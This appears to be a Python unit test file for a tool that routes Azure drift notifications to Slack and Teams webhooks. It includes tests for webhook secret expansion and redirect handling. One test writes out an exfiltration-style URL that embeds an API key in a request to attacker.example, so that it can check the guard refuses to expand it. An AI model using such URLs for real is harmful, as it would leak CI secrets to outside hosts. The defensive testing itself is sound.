"""
Unit tests for Phase 4 owner-based notification routing.

Covers OwnerFilter, events_from_report (owner tag preserved from JSON report),
and NotificationRouter routing events to the correct team by owner.
"""

import json
import os
import sys
import tempfile
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from tools.send_notifications import (
    DriftEvent,
    OwnerFilter,
    NotificationRouter,
    events_from_report,
    events_from_reports_dir,
    build_team_notifications,
    expand_webhook_secrets,
)


class OwnerFilterTests(unittest.TestCase):
    def test_empty_config_accepts_all_owners(self):
        f = OwnerFilter(None)
        self.assertTrue(f.should_notify(DriftEvent("DRIFT", "t", "n", owner="platform")))
        self.assertTrue(f.should_notify(DriftEvent("DRIFT", "t", "n", owner="workload")))
        self.assertTrue(f.should_notify(DriftEvent("DRIFT", "t", "n", owner="unknown")))

    def test_list_config_matches_only_listed_owner(self):
        f = OwnerFilter(["platform"])
        self.assertTrue(f.should_notify(DriftEvent("DRIFT", "t", "n", owner="platform")))
        self.assertFalse(f.should_notify(DriftEvent("DRIFT", "t", "n", owner="workload")))

    def test_string_config_is_split_and_case_insensitive(self):
        f = OwnerFilter("Platform, Workload")
        self.assertEqual(f.owners, {"platform", "workload"})
        self.assertTrue(f.should_notify(DriftEvent("DRIFT", "t", "n", owner="WORKLOAD")))

    def test_missing_owner_defaults_to_unknown(self):
        f = OwnerFilter(["platform"])
        self.assertFalse(f.should_notify(DriftEvent("DRIFT", "t", "n")))  # owner defaults 'unknown'


class EventsFromReportTests(unittest.TestCase):
    def _write_report(self, report):
        f = tempfile.NamedTemporaryFile("w", suffix="-drift.json", delete=False)
        json.dump(report, f)
        f.close()
        return f.name

    def test_owner_and_event_type_mapping_preserved(self):
        path = self._write_report({
            "drifts": [
                {"type": "Microsoft.Network/virtualNetworks", "name": "vnet",
                 "drift_type": "property_drift", "owner": "platform",
                 "details": {"changed_properties": {"properties.addressSpace": {}}}},
                {"type": "Microsoft.Web/sites", "name": "app",
                 "drift_type": "extra_in_azure", "owner": "workload"},
                {"type": "Microsoft.Storage/storageAccounts", "name": "st",
                 "drift_type": "missing_in_azure", "owner": "workload"},
            ]
        })
        events = events_from_report(path)
        self.assertEqual([e.owner for e in events], ["platform", "workload", "workload"])
        self.assertEqual([e.event_type for e in events], ["DRIFT", "EXTRA", "MISSING"])
        self.assertIn("addressSpace", events[0].details)

    def test_matched_unresolvable_is_not_notified(self):
        # Informational reconciliation entries (runtime-named resource matched to
        # its deployed counterpart) are not drift and must not create events.
        path = self._write_report({
            "drifts": [
                {"type": "microsoft.storage/storageaccounts", "name": "stgabc123",
                 "drift_type": "matched_unresolvable", "owner": "workload"},
                {"type": "Microsoft.Storage/storageAccounts", "name": "stgdrifted",
                 "drift_type": "property_drift", "owner": "workload",
                 "details": {"changed_properties": {"sku.name": {}}}},
            ]
        })
        events = events_from_report(path)
        self.assertEqual([e.resource_name for e in events], ["stgdrifted"])

    def test_policy_enforced_drifts_are_not_notified(self):
        path = self._write_report({
            "drifts": [{"type": "t", "name": "n", "drift_type": "property_drift", "owner": "platform"}],
            "policy_enforced_drifts": [{"type": "t2", "name": "n2", "drift_type": "extra_in_azure"}],
        })
        events = events_from_report(path)
        self.assertEqual(len(events), 1)

    def test_missing_file_returns_empty(self):
        self.assertEqual(events_from_report("/no/such/report.json"), [])


class BuildTeamNotificationsTests(unittest.TestCase):
    def test_flat_config_is_wrapped_under_lz_name(self):
        flat = {"slack": "https://x", "filter": "all", "owners": ["platform"]}
        result = build_team_notifications(flat, "platform-lz")
        self.assertEqual(result, {"platform-lz": flat})

    def test_multi_team_config_is_passed_through(self):
        multi = {
            "platform-team": {"teams": "https://x", "owners": ["platform"]},
            "app-teams": {"slack": "https://y", "owners": ["workload"]},
        }
        self.assertEqual(build_team_notifications(multi, "ignored-name"), multi)

    def test_empty_config_returns_empty(self):
        self.assertEqual(build_team_notifications({}, "lz"), {})
        self.assertEqual(build_team_notifications(None, "lz"), {})


class EventsFromReportsDirTests(unittest.TestCase):
    def test_aggregates_every_report_in_dir(self):
        d = tempfile.mkdtemp()
        for i, owner in enumerate(["platform", "workload"]):
            with open(os.path.join(d, f"rg{i}-drift.json"), "w") as f:
                json.dump({"drifts": [
                    {"type": "t", "name": f"r{i}", "drift_type": "property_drift", "owner": owner}
                ]}, f)
        # a non-report file should be ignored
        with open(os.path.join(d, "notes.txt"), "w") as f:
            f.write("ignore me")
        events = events_from_reports_dir(d)
        self.assertEqual(sorted(e.owner for e in events), ["platform", "workload"])

    def test_missing_dir_returns_empty(self):
        self.assertEqual(events_from_reports_dir("/no/such/dir"), [])


class RouterOwnerRoutingTests(unittest.TestCase):
    def setUp(self):
        self.events = [
            DriftEvent("DRIFT", "Microsoft.Network/virtualNetworks", "vnet", owner="platform"),
            DriftEvent("EXTRA", "Microsoft.Web/sites", "app", owner="workload"),
        ]

    def _router(self, config):
        with mock.patch.dict(os.environ, {"DRIFT_NOTIFICATIONS": json.dumps(config)}, clear=False):
            return NotificationRouter()

    def test_platform_team_only_gets_platform_events(self):
        router = self._router({
            "platform-team": {"slack": "https://hooks.slack/x", "owners": ["platform"]},
            "app-team": {"slack": "https://hooks.slack/y", "owners": ["workload"]},
        })
        sent = {}

        def fake_slack(url, message):
            sent.setdefault(url, []).append(message)
            return True

        with mock.patch.object(router, "_send_to_slack", side_effect=fake_slack):
            ok = router.send_notifications(self.events, {"report_url": "r"})
        self.assertTrue(ok)
        # platform team's url got the vnet, app team's url got the app site
        self.assertEqual(len(sent["https://hooks.slack/x"]), 1)
        self.assertIn("vnet", sent["https://hooks.slack/x"][0])
        self.assertEqual(len(sent["https://hooks.slack/y"]), 1)
        self.assertIn("app", sent["https://hooks.slack/y"][0])

    def test_team_without_owners_gets_everything(self):
        router = self._router({"all-team": {"slack": "https://hooks.slack/z"}})
        sent = []
        with mock.patch.object(router, "_send_to_slack", side_effect=lambda u, m: sent.append(m) or True):
            router.send_notifications(self.events, {"report_url": "r"})
        self.assertEqual(len(sent), 2)  # both events, backward compatible


class WebhookSecretExpansionTests(unittest.TestCase):
    """${DRIFT_WEBHOOK_*} placeholder expansion in configured webhook URLs.

    LZ-repo configs are untrusted data, so only DRIFT_WEBHOOK_* names may be
    expanded, and an unresolved placeholder must fail (empty result) rather
    than send to a literal ${...} URL or silently skip the channel.
    """

    def test_plain_url_passes_through(self):
        url = "https://hooks.slack.com/services/plain"
        self.assertEqual(expand_webhook_secrets(url), url)

    def test_expands_from_environment(self):
        with mock.patch.dict(os.environ, {"DRIFT_WEBHOOK_PLATFORM": "https://hooks.slack/env"}):
            self.assertEqual(
                expand_webhook_secrets("${DRIFT_WEBHOOK_PLATFORM}"), "https://hooks.slack/env"
            )

    def test_expands_from_webhook_secrets_json(self):
        blob = json.dumps({"DRIFT_WEBHOOK_APP": "https://hooks.slack/ci"})
        with mock.patch.dict(os.environ, {"WEBHOOK_SECRETS": blob}, clear=True):
            self.assertEqual(
                expand_webhook_secrets("${DRIFT_WEBHOOK_APP}"), "https://hooks.slack/ci"
            )

    def test_env_var_wins_over_json_blob(self):
        blob = json.dumps({"DRIFT_WEBHOOK_APP": "https://hooks.slack/ci"})
        with mock.patch.dict(
            os.environ,
            {"WEBHOOK_SECRETS": blob, "DRIFT_WEBHOOK_APP": "https://hooks.slack/local"},
            clear=True,
        ):
            self.assertEqual(
                expand_webhook_secrets("${DRIFT_WEBHOOK_APP}"), "https://hooks.slack/local"
            )

    def test_placeholder_embedded_in_longer_url(self):
        with mock.patch.dict(os.environ, {"DRIFT_WEBHOOK_TOKEN": "T00/B00/xyz"}):
            self.assertEqual(
                expand_webhook_secrets("https://hooks.slack.com/services/${DRIFT_WEBHOOK_TOKEN}"),
                "https://hooks.slack.com/services/T00/B00/xyz",
            )

    def test_non_prefixed_name_is_refused_even_if_set(self):
        # Exfiltration guard: config may not reference arbitrary CI secrets.
        with mock.patch.dict(os.environ, {"ANTHROPIC_API_KEY": "sk-secret"}):
            self.assertEqual(
                expand_webhook_secrets("https://attacker.example/${ANTHROPIC_API_KEY}"), ""
            )

    def test_json_blob_only_exposes_prefixed_names(self):
        blob = json.dumps({"AZURE_CLIENT_ID": "abc", "DRIFT_WEBHOOK_X": "https://ok"})
        with mock.patch.dict(os.environ, {"WEBHOOK_SECRETS": blob}, clear=True):
            self.assertEqual(expand_webhook_secrets("${DRIFT_WEBHOOK_X}"), "https://ok")
            self.assertEqual(expand_webhook_secrets("${AZURE_CLIENT_ID}"), "")

    def test_unset_secret_fails_expansion(self):
        with mock.patch.dict(os.environ, {}, clear=True):
            self.assertEqual(expand_webhook_secrets("${DRIFT_WEBHOOK_MISSING}"), "")

    def test_invalid_webhook_secrets_json_is_ignored(self):
        with mock.patch.dict(
            os.environ,
            {"WEBHOOK_SECRETS": "not-json", "DRIFT_WEBHOOK_A": "https://hooks.slack/a"},
            clear=True,
        ):
            self.assertEqual(expand_webhook_secrets("${DRIFT_WEBHOOK_A}"), "https://hooks.slack/a")

    def test_router_fails_team_when_secret_unresolved(self):
        config = {"team": {"slack": "${DRIFT_WEBHOOK_MISSING}"}}
        with mock.patch.dict(
            os.environ, {"DRIFT_NOTIFICATIONS": json.dumps(config)}, clear=True
        ):
            router = NotificationRouter()
        sent = []
        with mock.patch.object(router, "_send_to_slack", side_effect=lambda u, m: sent.append(u) or True):
            ok = router.send_notifications(
                [DriftEvent("DRIFT", "t", "n", owner="workload")], {"report_url": "r"}
            )
        self.assertFalse(ok)      # misconfiguration is a hard failure (CI step exits 1)
        self.assertEqual(sent, [])  # nothing sent to a literal ${...} URL

    def test_router_expands_secret_before_sending(self):
        config = {"team": {"slack": "${DRIFT_WEBHOOK_TEAM}"}}
        with mock.patch.dict(
            os.environ,
            {
                "DRIFT_NOTIFICATIONS": json.dumps(config),
                "DRIFT_WEBHOOK_TEAM": "https://hooks.slack/real",
            },
            clear=True,
        ):
            router = NotificationRouter()
            sent = []
            with mock.patch.object(router, "_send_to_slack", side_effect=lambda u, m: sent.append(u) or True):
                ok = router.send_notifications(
                    [DriftEvent("DRIFT", "t", "n", owner="workload")], {"report_url": "r"}
                )
        self.assertTrue(ok)
        self.assertEqual(sent, ["https://hooks.slack/real"])


class WebhookRedirectTests(unittest.TestCase):
    """A 3xx from a webhook must count as failure, not be silently followed.

    Regression for a truncated Slack webhook secret: hooks.slack.com answered
    the POST with 302, urllib followed it to a generic 200 page, and the agent
    logged 'notification sent' while nothing reached the channel.
    """

    @classmethod
    def setUpClass(cls):
        import http.server
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            posts = []

            def do_POST(self):
                self.rfile.read(int(self.headers.get("Content-Length", 0)))
                Handler.posts.append(self.path)
                if self.path.startswith("/redirect"):
                    self.send_response(302)
                    self.send_header("Location", f"http://127.0.0.1:{cls.port}/landing")
                    self.end_headers()
                else:
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"ok")

            def do_GET(self):  # where a followed redirect would land
                Handler.posts.append("GET " + self.path)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"generic page")

            def log_message(self, *args):
                pass

        cls.handler = Handler
        cls.server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
        cls.port = cls.server.server_address[1]
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def setUp(self):
        self.handler.posts.clear()
        with mock.patch.dict(os.environ, {}, clear=True):
            self.router = NotificationRouter()

    def test_slack_redirect_is_failure(self):
        ok = self.router._send_to_slack(f"http://127.0.0.1:{self.port}/redirect", "hi")
        self.assertFalse(ok)
        self.assertEqual(self.handler.posts, ["/redirect"])  # redirect not followed

    def test_teams_redirect_is_failure(self):
        ok = self.router._send_to_teams(f"http://127.0.0.1:{self.port}/redirect", "hi")
        self.assertFalse(ok)
        self.assertEqual(self.handler.posts, ["/redirect"])

    def test_direct_200_still_succeeds(self):
        ok = self.router._send_to_slack(f"http://127.0.0.1:{self.port}/hook", "hi")
        self.assertTrue(ok)


if __name__ == "__main__":
    unittest.main()


class SeverityInEventTests(unittest.TestCase):
    """Critical findings must not read like routine drift in the channel:
    property drift carries the highest per-property severity onto the event
    (with a CRITICAL prefix in details), and {{ severity }} is a template var.
    Live gap: the out-of-band authorizedIPRanges finding rendered identically
    to a capacity tweak."""

    def _report_event(self, changed_properties):
        report = {"drifts": [{
            "type": "Microsoft.ContainerService/managedClusters",
            "name": "aks-drift-test",
            "drift_type": "property_drift",
            "owner": "workload",
            "details": {"changed_properties": changed_properties},
        }]}
        with tempfile.NamedTemporaryFile("w", suffix="-drift.json", delete=False) as f:
            json.dump(report, f)
            path = f.name
        try:
            return events_from_report(path)[0]
        finally:
            os.unlink(path)

    def test_critical_property_sets_severity_and_prefix(self):
        ev = self._report_event({
            "properties.apiServerAccessProfile.authorizedIPRanges": {
                "desired": [], "actual": ["1.2.3.4/32"], "severity": "critical"},
        })
        self.assertEqual(ev.severity, "critical")
        self.assertTrue(ev.details.startswith("🚨 CRITICAL "))

    def test_highest_severity_wins_across_properties(self):
        ev = self._report_event({
            "tags.env": {"severity": "warning"},
            "properties.enableRBAC": {"severity": "critical"},
        })
        self.assertEqual(ev.severity, "critical")

    def test_warning_only_has_no_critical_prefix(self):
        ev = self._report_event({"sku.name": {"severity": "warning"}})
        self.assertEqual(ev.severity, "warning")
        self.assertNotIn("CRITICAL", ev.details)

    def test_missing_severity_defaults_empty(self):
        ev = self._report_event({"properties.x": {}})
        self.assertEqual(ev.severity, "")

    def test_privileged_rbac_extra_is_critical(self):
        report = {"drifts": [{
            "type": "Microsoft.Authorization/roleAssignments",
            "name": "Owner -> User:someone",
            "drift_type": "extra_in_azure",
            "owner": "platform",
            "details": {"role_name": "Owner", "scope": "/sub/x", "privileged": True},
        }]}
        with tempfile.NamedTemporaryFile("w", suffix="-drift.json", delete=False) as f:
            json.dump(report, f)
            path = f.name
        try:
            ev = events_from_report(path)[0]
        finally:
            os.unlink(path)
        self.assertEqual(ev.severity, "critical")

    def test_severity_template_variable_renders(self):
        ev = DriftEvent(event_type="DRIFT", resource_type="T", resource_name="n",
                        severity="critical")
        ctx = NotificationRouter._event_context({"report_url": "u"}, ev)
        self.assertEqual(ctx["severity"], "critical")
